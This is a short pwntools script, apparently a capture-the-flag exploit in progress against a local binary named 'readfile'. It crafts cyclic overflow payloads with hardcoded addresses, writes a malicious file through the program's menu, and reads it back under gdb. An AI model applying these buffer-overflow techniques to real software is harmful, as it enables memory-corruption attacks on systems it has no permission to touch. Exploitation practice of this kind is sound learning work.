from pwn import *
import string

# context.terminal = ['tmux', 'splitw', '-h']

r = None

def write_file(name, data):
    r.sendline('1')
    r.sendline(name)
    r.sendline(str(len(data)))
    r.sendline(data)

def read_file(name):
    r.sendline('2')
    r.sendline(name)

data = cyclic(cyclic_find('ARAA', alphabet=string.ascii_uppercase))
data += p32(0x804af00) # 2) Some valid address to pass fclose
data += cyclic(240-len(data), alphabet=string.ascii_uppercase)
filename = '/tmp/' + data
print(filename)
try:
    os.remove(filename)
except:
    pass

r = process("./readfile")

data = 'a' * cyclic_find('paac')
data += p32(0x804a0a0) # 1) Some valid address to pass fclose
data += 'b' * (1000 - len(data))
write_file(filename, data)

r = process("./readfile")
gdb.attach(r, '''
break *0x0804890a
c
''')
read_file(filename)

r.interactive()
